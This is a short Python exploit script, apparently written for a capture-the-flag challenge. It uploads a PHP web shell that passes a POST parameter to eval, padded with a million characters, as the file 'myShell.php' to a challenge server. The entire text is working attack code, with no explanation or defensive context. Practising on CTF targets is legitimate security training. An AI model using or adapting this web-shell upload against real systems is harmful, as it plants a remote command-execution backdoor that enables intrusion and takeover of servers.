import requests

payload = "<?php eval($_POST['cmd']); //"+ 'a'*1000000

data = {
    'data': payload,
    'name': 'myShell.php'
}

resp = requests.post("http://web.soctf.com:31002/", data)